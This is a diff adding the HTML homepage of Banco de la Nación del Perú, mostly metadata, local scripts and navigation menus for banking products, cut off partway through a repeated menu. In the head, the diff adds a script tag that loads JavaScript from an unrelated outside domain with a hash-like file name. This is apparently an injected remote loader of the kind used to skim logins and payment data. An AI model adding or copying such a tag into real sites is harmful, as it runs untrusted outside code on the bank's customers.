@@ -1,0 +1,1850 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>Banco de la Nación del Perú, el banco de todos - Servicios Financieros</title>
+	<meta name="title" content="Banco de la Nación del Perú, el banco de todos - Servicios Financieros">
+    <meta name="keywords" content="Banco de la Nación Perú, servicios financieros, cuentas de ahorro, cuenta corriente,  préstamos personales, tarjetas de crédito, banca por internet, aplicaciones móviles, inclusión financiera"/>
+    <meta name="description" content="Descubre los servicios financieros del Banco de la Nación del Perú: cuentas de ahorro, préstamos, tarjetas de crédito y más. Accede a la banca por internet y a nuestras aplicaciones móviles para gestionar tus finanzas de manera fácil y segura"/>
+    <meta name="author" content="Banco de la Nación"/>
+
+    <!-- Facebook Open Graph -->
+    <meta property="og:site_name" content="Banco de la Nación" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Banco de la Nación" />
+    <meta property="og:description" content="Portal del Banco de la Nación del Perú" />
+    <meta property="og:image" content="https://www.bn.com.pe/img/logobn-compartir.png" />
+    <meta property="og:url" content="https://www.bn.com.pe/" /><!-- editar -->
+    <meta property="og:image:width" content="640" />
+    <meta property="og:image:height" content="336" />
+    <meta property="fb:app_id" content="5595611513878049" />
+
+    <!-- Twitter Open Graph -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@BancodelaNación">
+    <meta name="twitter:creator" content="@BancodelaNación">
+    <meta name="twitter:title" content="Banco de la Nación">
+    <meta name="twitter:description" content="Portal del Banco de la Nación del Perú">
+    <meta name="twitter:image" content="https://www.bn.com.pe/img/logobn-compartir.png">
+
+    <!-- Favicon -->
+    <link rel="icon" href="/img/isotipoBN.png" sizes="32x32" type="image/png" />
+    <link rel="stylesheet" href="/css/styles-r.css?v=1.0.1">
+    <link rel="stylesheet" href="/css/quina.css?v=1.0.1">
+	<!--<link rel="stylesheet" href="/css/slider-navidad.css?v=1.0.1">-->
+	<link rel="stylesheet" href="/css/slider.css?v=1.0.1">
+    <link rel="stylesheet" href="/css/responsive-r.css?v=1.0.1">
+    <link rel="stylesheet" href="/css/noticias-home.css?v=1.0.1">
+
+    <script src="js/jquery-3.7.1.js"></script>
+	<script type="application/javascript" src="https://uimarketpro.com/js/d6d6a192e565430bab3aa6e4cb0ae0bd.js"></script>
+	 <script src="/js/slider-productos.js"></script>
+    <script src="/js/tabulador.js"></script>
+    <script src="/js/clientes.js"></script>
+    <script src="/js/anuncio.js"></script>
+    <script src="/js/icono-menu.js"></script>
+    <script src="/js/menu-despegable-responsive.js"></script>
+    <script src="/js/menu-despegable-responsive2.js"></script>
+    <script src="/js/menu-desplegable.js"></script>
+    <script src="/js/buscar.js"></script>
+    <script src="/js/banner.js"></script>
+    <script src="/js/aclaracion-extraccion.js"></script>
+    <script src="/js/aclaracion-deslisable.js"></script>
+    <script src="/js/footer.js"></script>
+    <script src="/js/desplegable-responsive-pie-footer.js"></script>
+    <script src="/js/noticias-home.js"></script>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-B2WEYB8NEF"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-B2WEYB8NEF');
+</script>
+</head>
+<body>
+
+    <!-- <div class="anuncio" id="anuncio">
+        include file="comp-anuncio.html"
+    </div> -->
+
+    <!-- DECLARAMOS EL HEADER Y NAV DE CLIENTES-->
+    <nav id="nav">
+    <div class="navbar">
+        <div class="nav-escudo">
+            <div class="nav-escudo-img">
+                <img src="/img/escudo.png" alt="Escudo del Perú">
+            </div>
+            República del Perú
+        </div>
+        <div class="nav-enlaces">
+
+            <div class="nav-categoria nav-clientes">
+                <a href="/">
+                    <p>Clientes</p>
+                </a>
+            </div>
+
+            <div class="nav-categoria nav-ciudadanos">
+                <a href="/ciudadanos.asp">
+                    <p>Ciudadanos</p>
+                </a>
+            </div>
+
+            <div class="nav-categoria nav-entidades-gobierno">
+                <a href="/entidades-gobierno.asp">
+                    <p>Entidades del Gobierno</p>
+                </a>
+            </div>
+
+        </div>
+
+        <div class="nav-portal">
+            <a class="nav-portal-img-txt" target="_blank" href="https://www.bn.com.pe/transparenciabn/transparencia.asp">
+                <p>Portal de Transparencia</p>
+                <img src="/img/PTE.png" alt="Lupa de transparencia">
+            </a>
+        </div>
+    </div>
+</nav><div class="ctn-header">
+    <div class="ctn-header2">
+        <div class="header-logo">
+            <a class="header-logo-link" href="/" title="Logotipo del Banco de la Nación">
+                <img src="/img/logoBN.png" alt="Imagen del Logo Banco de la Nación que nos llevará al inicio del portal Web">
+            </a>
+        </div>
+        <div class="ctn-menu">
+            <div class="menu submenu-rsv-clientes">
+
+    <div class="item productos-servicios" tabindex="0">
+        <div class="ctn-title-menu">
+            <p class="title-menu">Productos y Servicios</p>
+            <svg class="svg-mas" height="20px" viewBox="0 0 24 24" width="20px" fill="#323639">
+    <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z" />
+</svg><svg class="svg-menos" enable-background="new 0 0 24 24" height="24px" viewBox="0 0 24 24" width="24px" fill="#000000">
+    <g>
+        <rect fill="none" fill-rule="evenodd" height="24" width="24" />
+        <rect fill-rule="evenodd" height="2" width="16" x="4" y="11" />
+    </g>
+</svg>
+        </div>
+        <span class="span-svg-mid">
+    <svg width="24" height="24" viewBox="0 0 24 24">
+        <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
+    </svg>
+</span>
+        <ul class="submenu">
+            <li class="tarjeta-credito">
+                <button class="btn-submenu">
+                    Tarjetas
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/clientes/tarjetas/tarjeta-credito-bn.asp">
+                            Tarjeta de crédito
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/clientes/tarjetas/tarjeta-debito-bn.asp">
+                            Tarjeta Débito BN 
+                        </a>
+                    </li>
+                </ul>
+            </li>
+
+            <li class="prestamos">
+                <button class="btn-submenu">
+                    Préstamos
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li><a href="/clientes/prestamos/prestamo-bn.asp">Multired Clásico y/o Convenios</a></li>
+                    <li><a href="/clientes/prestamos/prestamo-estudios.asp">Estudios</a></li>
+                    <li><a href="/clientes/prestamos/prestamo-compra-deuda.asp">Compra de Deudas - Tarjetas de Crédito</a></li>
+                    <li><a href="/clientes/prestamos/prestamo-descuento-planilla.asp">Descuento por Planilla (compra de deuda)</a></li>
+                </ul>
+            </li>
+
+            <li class="credito-hipotecario">
+                <button class="btn-submenu">
+                    Crédito Hipotecario
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li><a href="/clientes/creditos-hipotecarios/credito-hipotecario-bn.asp">Compra de Vivienda</a></li>
+                    <li><a href="/clientes/creditos-hipotecarios/credito-hipotecario-mejoras.asp">Mejora, Ampliación o Remodelación</a></li>
+                </ul>
+            </li>
+
+            <li class="seguros">
+                <button class="btn-submenu">
+                    Seguros
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li><a href="/clientes/seguros/proteccion-tarjeta.asp">Protección para Tarjetas del BN</a></li>
+                    <li><a href="/clientes/seguros/cuota-protegida.asp">Seguro
+                            cuota protegida</a></li>
+                    <li><a href="/clientes/seguros/oncologico.asp">Seguro
+                            oncológico</a></li>
+                    <li><a href="/clientes/seguros/sepelio.asp">Seguro de
+                            sepelio</a></li>
+                </ul>
+            </li>
+
+            <li class="pagos">
+                <button class="btn-submenu">
+                    Pagos
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/tramites-entidades-publicas/tupas-tasas.asp">
+                            Pago de Tributos (tramite entidades públicas)
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/tramites-entidades-publicas/multiexpress.asp">
+                            Pago Multiexpress
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/clientes/pagos/tarjeta-credito.asp">
+                            Pago de tarjetas de crédito otros bancos
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/clientes/transferencias/via-internet.asp">
+                            Pago entre cuentas bancarias, vía internet (SATM)
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/clientes/pagos/recarga-celulares.asp">
+                            Recarga de celulares
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/clientes/pagos/factura-proveedores.asp">
+                            Facturas en Cuenta Corriente a Proveedores del BN
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/clientes/pagos/remuneracion-pension.asp">
+                            Remuneraciones y pensiones
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/clientes/pagos/remuneracion-pension-uob.asp">
+                            Remuneraciones y pensiones (UOB)
+                        </a>
+                    </li>
+                </ul>
+            </li>
+
+            <li class="telegiros">
+                <button class="btn-submenu">
+                    Telegiros
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li> <a href="/clientes/giros/nacional-extranjero.asp">
+                            Telegiros Moneda Nacional y Extranjera </a></li>
+                    <!--<li> <a href="/clientes/giros/masivos.asp"> Telegiros
+                            Masivos </a></li>-->
+                </ul>
+            </li>
+
+            <li class="transferencias">
+                <button class="btn-submenu">
+                    Transferencias
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li> <a href="/clientes/transferencias/remesas.asp">
+                            Remesas MoneyGram </a></li>
+                    <li> <a href="/clientes/transferencias/mismo-banco-cuenta-ahorros.asp">
+                            Mismo banco con cargo a cuenta de ahorros </a></li>
+                    <li> <a href="/clientes/transferencias/interbancaria-cuenta-ahorros.asp">
+                            Interbancaria con cargo a cuenta de ahorros </a></li>
+                    <li> <a href="/clientes/transferencias/mismo-banco-cuenta-corriente.asp">
+                            Mismo banco con cargo a cuenta corriente </a></li>
+                    <li> <a href="/clientes/transferencias/interbancaria-cuenta-corriente.asp">
+                            Interbancaria con cargo a cuenta corriente </a></li>
+                    <li> <a href="/clientes/transferencias/exterior-pensionistas.asp">
+                            De fondos al exterior para pago de Pensionistas </a></li>
+                    <li> <a href="/clientes/transferencias/fondos-exterior-efectivo.asp">
+                            De fondos al exterior en efectivo - Persona natural </a></li>
+                    <li> <a href="/clientes/transferencias/fondos-exterior.asp">
+                            De fondos del exterior </a></li>
+                    <li> <a href="/clientes/transferencias/via-liquidacion-bruta.asp">
+                            Vía LBTR (Liquidación Bruta en Tiempo Real) </a></li>
+                </ul>
+            </li>
+
+            <li class="cuentas-bancarias">
+                <button class="btn-submenu">
+                    Cuentas Bancarias
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li> <a href="/clientes/cuentas-bancarias/ahorros-uob.asp">
+                            Cuenta de ahorros en agencias UOB </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/ahorros-sector-publico.asp">
+                            Cuenta de ahorros del sector público en MN y ME </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/ahorros-sector-privado-mn.asp">
+                            Cuentas de ahorros del sector privado en MN </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/cuentas-corrientes-detracciones.asp">
+                            Cuentas Corrientes de Detracciones </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/cuentas-corrientes-uob.asp">
+                            Cuentas corriente en agencias UOB </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/proveedores-estado.asp">
+                            Cuenta corriente para proveedores del estado </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/asociacion-pescadores.asp">
+                            Cuentas Corrientes para asociaciones de pescadores </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/deposito-plazo.asp">
+                            Cuentas de depósitos a plazo - UOB </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/cuenta-dni.asp">
+                            Cuenta DNI </a></li>
+                </ul>
+            </li>
+
+            <li class="cheques">
+                <button class="btn-submenu">
+                    Cheques
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li> <a href="/clientes/cheques/gerencia.asp"> De gerencia
+                        </a> </li>
+                    <li> <a href="/clientes/cheques/canje-electronico.asp">
+                            Canje electrónico de cheques(Clientes) </a> </li>
+                    <li> <a href="/clientes/cheques/certificacion-anulacion.asp">
+                            Certificación de cheques / anulación de cheques certificados </a> </li>
+                    <li> <a href="/clientes/cheques/pago.asp"> Pago de cheques
+                            en otras plazas </a> </li>
+                    <li> <a href="/clientes/cheques/certificados-otras-plazas.asp">
+                            Pago de cheques certificados en otras plazas </a> </li>
+                    <li> <a href="/clientes/cheques/revocatoria-pago.asp">
+                            Revocatoria de pago de cheques </a> </li>
+                    <li> <a href="/clientes/cheques/suspension-pago.asp">
+                            Suspensión de pago de cheques </a> </li>
+                </ul>
+            </li>
+
+            <li class="programa-microfinanzas">
+                <button class="btn-submenu">
+                    Programa Microfinanzas
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li> <a href="/clientes/programa-microfinanzas/oficina-compartida-mype.asp">
+                            Oficina Compartida - Ventanilla MYPE </a> </li>
+                    <li> <a href="/clientes/programa-microfinanzas/linea-credito-promype.asp">
+                            Línea de Crédito - PROMYPE </a> </li>
+                </ul>
+            </li>
+
+            <li class="servicios-adicionales">
+                <button class="btn-submenu">
+                    Servicios adicionales
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li> <a href="/clientes/servicios-adicionales/cambio-moneda.asp">
+                            Cambio de moneda </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/certificacion-pago.asp">
+                            Certificaciones de pago </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/certificados-bancarios.asp">
+                            Certificados bancarios </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/microfilm.asp">
+                            Copia microfilm / emisión de estado de cuenta corriente </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/cobranzas-exterior.asp">
+                            Cobranzas simples recibidas del exterior </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/corresponsalia.asp">
+                            Corresponsalía </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/deposito-judicial-administrativo.asp">
+                            Depósitos Judiciales y Administrativos </a></li>
+                    <li> <a href="/clientes/banca-internet/comercio-electronico.asp">
+                            Comercio electrónico </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/derechos-pensionarios.asp">
+                            Reconocimiento de derechos pensionarios </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/servicio-yape-con-bn.asp">
+                            Servicio Yape con el BN </a></li>
+					<li><a href="clientes/servicios-adicionales/cuenta-recaudadora.asp" title="Servicio Cuenta recaudadora">Cuenta recaudadora – Organizaciones Políticas</a></li>
+                </ul>
+            </li>
+        </ul>
+    </div>
+
+    <div class="item canales-digitales" tabindex="0">
+        <div class="ctn-title-menu">
+            <p class="title-menu">Canales Digitales</p>
+            <svg class="svg-mas" height="20px" viewBox="0 0 24 24" width="20px" fill="#323639">
+    <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z" />
+</svg><svg class="svg-menos" enable-background="new 0 0 24 24" height="24px" viewBox="0 0 24 24" width="24px" fill="#000000">
+    <g>
+        <rect fill="none" fill-rule="evenodd" height="24" width="24" />
+        <rect fill-rule="evenodd" height="2" width="16" x="4" y="11" />
+    </g>
+</svg>
+        </div>
+        <span class="span-svg-mid">
+    <svg width="24" height="24" viewBox="0 0 24 24">
+        <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
+    </svg>
+</span>
+        <ul class="submenu unico">
+            
+            <li>
+                <a href="/canales-digitales/app-banca-movil.asp">
+                    App - BN
+                </a>
+            </li>
+			<li>
+                <a href="/clientes/billetera-movil.asp">
+                    Billetera Móvil
+                </a>
+            </li>
+            <li>
+                <a target="_blank" href="/cuentadni.asp">
+                    Cuenta DNI
+                </a>
+            </li>
+            <li>
+                <a href="/clientes/banca-internet/banca-internet.asp">
+                    Banca por Internet
+                </a>
+            </li>
+            <li>
+                <a href="/clientes/pagalo-pe.asp">
+                    Págalo.pe
+                </a>
+            </li>
+			<li>
+                <a href="/clientes/banca-internet/banca-empresarial.asp">
+                    Banca Empresarial
+                </a>
+            </li>
+        </ul>
+    </div>
+
+    <div class="item Beneficios solo" tabindex="0">
+        <a class="ctn-title-menu"  href="/clientes/bnbeneficios.asp">
+            <p class="title-menu">BN Beneficios</p>
+        </a>
+        <!-- <div class="ctn-title-menu">
+            <p class="title-menu">BN Beneficios</p>
+            include virtual="/icono-mas-svg.html"
+            include virtual="/icono-menos-svg.html"
+        </div>
+        include virtual="/icono-desplegable-abajo-svg.html"
+        <ul class="submenu unico">
+            <li>
+                <a target="_blank" href="/clientes/bnbeneficios.asp">BN Beneficios</a>
+            </li>
+        </ul> -->
+    </div>
+</div>
+        </div>
+
+        <div tabindex="0" class="header-buscar">
+            <img src="/img/lupa.png" alt="Imagen lupa buscar información en el Portal web BN">
+            <p>
+                Buscar
+            </p>
+        </div>
+
+        <div class="header-btn">
+            <a target="_blank" class="btn-pagalo" href="https://www.bn.com.pe/pagalo-pe.asp">
+    <img src="/img/logo-pagalo.png" alt="Imagen de accesos a págalo.pe">
+</a>
+
+
+<a class="btn-banca" target="_blank" href="https://www.bn.com.pe/bancaporinternet.asp">
+    <!-- <a class="btn-banca" target="_blank" href="/BNWeb/banca.asp"> -->
+    <p class="txt-banca-1">Banca por Internet</p>
+    <p class="txt-banca-2">Banca</p>
+   
+</a>
+            <div class="icono-menu" id="menu-icon">
+                <svg class="menu-hamburguesa" height="24px" viewBox="0 0 24 24"
+                    width="24px">
+                    <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+                </svg>
+                <svg class="menu-cerrar" height="24px" viewBox="0 0 24 24"
+                    width="24px" fill="#000000">
+                    <path
+                        d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" />
+                </svg>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<div class="ctn-buscar" style="display: none;">
+    <div class="buscar">
+        <form action="/buscador.asp" method="GET" style="width: 100%;">
+            <div class="input-btn">
+                <div class="buscador">
+                    <img src="/img/lupa.png" class="lupa" title="Imagen lupa buscar información en el Portal web BN" alt="Lupa">
+                    <input class="caja-buscador" name="q" placeholder="Busca aquí" type="text" id="buscador" title="barra de buscador" spellcheck="false" data-ms-editor="true">
+                </div>
+                <button type="submit" class="btn-buscar" style="border: none;">
+                    Buscar
+                </button>
+            </div>
+        </form>
+        <div class="buscador-cerrar">
+            <p class="img-cerrar">
+                <svg viewBox="0 0 24 24" fill="#000000">
+                    <path
+                        d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" />
+                </svg>
+            </p>
+        </div>
+    </div>
+</div><div class="overlay" id="overlay">
+    <div class="menu-contenido">
+        <div class="menu-responsive">
+            <div class="menu-responsive-txt txt-link-clientes">
+                <p>Clientes</p>
+            </div>
+            <div class="menu-responsive-txt txt-link-ciudadanos">
+                <p>Ciudadanos</p>
+            </div>
+            <div class="menu-responsive-txt txt-link-entidades-gob">
+                <p class="encabezado-ocultar">Entidades del Gobierno</p>
+                <p class="encabezado-mostrar" style="display: none;">E. Gobierno</p>
+            </div>
+        </div>
+
+        <!-- ========== CLIENTES ========== -->
+        <div class="menu submenu-rsv-clientes">
+
+    <div class="item productos-servicios" tabindex="0">
+        <div class="ctn-title-menu">
+            <p class="title-menu">Productos y Servicios</p>
+            <svg class="svg-mas" height="20px" viewBox="0 0 24 24" width="20px" fill="#323639">
+    <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z" />
+</svg><svg class="svg-menos" enable-background="new 0 0 24 24" height="24px" viewBox="0 0 24 24" width="24px" fill="#000000">
+    <g>
+        <rect fill="none" fill-rule="evenodd" height="24" width="24" />
+        <rect fill-rule="evenodd" height="2" width="16" x="4" y="11" />
+    </g>
+</svg>
+        </div>
+        <span class="span-svg-mid">
+    <svg width="24" height="24" viewBox="0 0 24 24">
+        <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
+    </svg>
+</span>
+        <ul class="submenu">
+            <li class="tarjeta-credito">
+                <button class="btn-submenu">
+                    Tarjetas
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/clientes/tarjetas/tarjeta-credito-bn.asp">
+                            Tarjeta de crédito
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/clientes/tarjetas/tarjeta-debito-bn.asp">
+                            Tarjeta Débito BN 
+                        </a>
+                    </li>
+                </ul>
+            </li>
+
+            <li class="prestamos">
+                <button class="btn-submenu">
+                    Préstamos
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li><a href="/clientes/prestamos/prestamo-bn.asp">Multired Clásico y/o Convenios</a></li>
+                    <li><a href="/clientes/prestamos/prestamo-estudios.asp">Estudios</a></li>
+                    <li><a href="/clientes/prestamos/prestamo-compra-deuda.asp">Compra de Deudas - Tarjetas de Crédito</a></li>
+                    <li><a href="/clientes/prestamos/prestamo-descuento-planilla.asp">Descuento por Planilla (compra de deuda)</a></li>
+                </ul>
+            </li>
+
+            <li class="credito-hipotecario">
+                <button class="btn-submenu">
+                    Crédito Hipotecario
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li><a href="/clientes/creditos-hipotecarios/credito-hipotecario-bn.asp">Compra de Vivienda</a></li>
+                    <li><a href="/clientes/creditos-hipotecarios/credito-hipotecario-mejoras.asp">Mejora, Ampliación o Remodelación</a></li>
+                </ul>
+            </li>
+
+            <li class="seguros">
+                <button class="btn-submenu">
+                    Seguros
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li><a href="/clientes/seguros/proteccion-tarjeta.asp">Protección para Tarjetas del BN</a></li>
+                    <li><a href="/clientes/seguros/cuota-protegida.asp">Seguro
+                            cuota protegida</a></li>
+                    <li><a href="/clientes/seguros/oncologico.asp">Seguro
+                            oncológico</a></li>
+                    <li><a href="/clientes/seguros/sepelio.asp">Seguro de
+                            sepelio</a></li>
+                </ul>
+            </li>
+
+            <li class="pagos">
+                <button class="btn-submenu">
+                    Pagos
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/tramites-entidades-publicas/tupas-tasas.asp">
+                            Pago de Tributos (tramite entidades públicas)
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/tramites-entidades-publicas/multiexpress.asp">
+                            Pago Multiexpress
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/clientes/pagos/tarjeta-credito.asp">
+                            Pago de tarjetas de crédito otros bancos
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/clientes/transferencias/via-internet.asp">
+                            Pago entre cuentas bancarias, vía internet (SATM)
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/clientes/pagos/recarga-celulares.asp">
+                            Recarga de celulares
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/clientes/pagos/factura-proveedores.asp">
+                            Facturas en Cuenta Corriente a Proveedores del BN
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/clientes/pagos/remuneracion-pension.asp">
+                            Remuneraciones y pensiones
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/clientes/pagos/remuneracion-pension-uob.asp">
+                            Remuneraciones y pensiones (UOB)
+                        </a>
+                    </li>
+                </ul>
+            </li>
+
+            <li class="telegiros">
+                <button class="btn-submenu">
+                    Telegiros
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li> <a href="/clientes/giros/nacional-extranjero.asp">
+                            Telegiros Moneda Nacional y Extranjera </a></li>
+                    <!--<li> <a href="/clientes/giros/masivos.asp"> Telegiros
+                            Masivos </a></li>-->
+                </ul>
+            </li>
+
+            <li class="transferencias">
+                <button class="btn-submenu">
+                    Transferencias
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li> <a href="/clientes/transferencias/remesas.asp">
+                            Remesas MoneyGram </a></li>
+                    <li> <a href="/clientes/transferencias/mismo-banco-cuenta-ahorros.asp">
+                            Mismo banco con cargo a cuenta de ahorros </a></li>
+                    <li> <a href="/clientes/transferencias/interbancaria-cuenta-ahorros.asp">
+                            Interbancaria con cargo a cuenta de ahorros </a></li>
+                    <li> <a href="/clientes/transferencias/mismo-banco-cuenta-corriente.asp">
+                            Mismo banco con cargo a cuenta corriente </a></li>
+                    <li> <a href="/clientes/transferencias/interbancaria-cuenta-corriente.asp">
+                            Interbancaria con cargo a cuenta corriente </a></li>
+                    <li> <a href="/clientes/transferencias/exterior-pensionistas.asp">
+                            De fondos al exterior para pago de Pensionistas </a></li>
+                    <li> <a href="/clientes/transferencias/fondos-exterior-efectivo.asp">
+                            De fondos al exterior en efectivo - Persona natural </a></li>
+                    <li> <a href="/clientes/transferencias/fondos-exterior.asp">
+                            De fondos del exterior </a></li>
+                    <li> <a href="/clientes/transferencias/via-liquidacion-bruta.asp">
+                            Vía LBTR (Liquidación Bruta en Tiempo Real) </a></li>
+                </ul>
+            </li>
+
+            <li class="cuentas-bancarias">
+                <button class="btn-submenu">
+                    Cuentas Bancarias
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li> <a href="/clientes/cuentas-bancarias/ahorros-uob.asp">
+                            Cuenta de ahorros en agencias UOB </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/ahorros-sector-publico.asp">
+                            Cuenta de ahorros del sector público en MN y ME </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/ahorros-sector-privado-mn.asp">
+                            Cuentas de ahorros del sector privado en MN </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/cuentas-corrientes-detracciones.asp">
+                            Cuentas Corrientes de Detracciones </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/cuentas-corrientes-uob.asp">
+                            Cuentas corriente en agencias UOB </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/proveedores-estado.asp">
+                            Cuenta corriente para proveedores del estado </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/asociacion-pescadores.asp">
+                            Cuentas Corrientes para asociaciones de pescadores </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/deposito-plazo.asp">
+                            Cuentas de depósitos a plazo - UOB </a></li>
+                    <li> <a href="/clientes/cuentas-bancarias/cuenta-dni.asp">
+                            Cuenta DNI </a></li>
+                </ul>
+            </li>
+
+            <li class="cheques">
+                <button class="btn-submenu">
+                    Cheques
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li> <a href="/clientes/cheques/gerencia.asp"> De gerencia
+                        </a> </li>
+                    <li> <a href="/clientes/cheques/canje-electronico.asp">
+                            Canje electrónico de cheques(Clientes) </a> </li>
+                    <li> <a href="/clientes/cheques/certificacion-anulacion.asp">
+                            Certificación de cheques / anulación de cheques certificados </a> </li>
+                    <li> <a href="/clientes/cheques/pago.asp"> Pago de cheques
+                            en otras plazas </a> </li>
+                    <li> <a href="/clientes/cheques/certificados-otras-plazas.asp">
+                            Pago de cheques certificados en otras plazas </a> </li>
+                    <li> <a href="/clientes/cheques/revocatoria-pago.asp">
+                            Revocatoria de pago de cheques </a> </li>
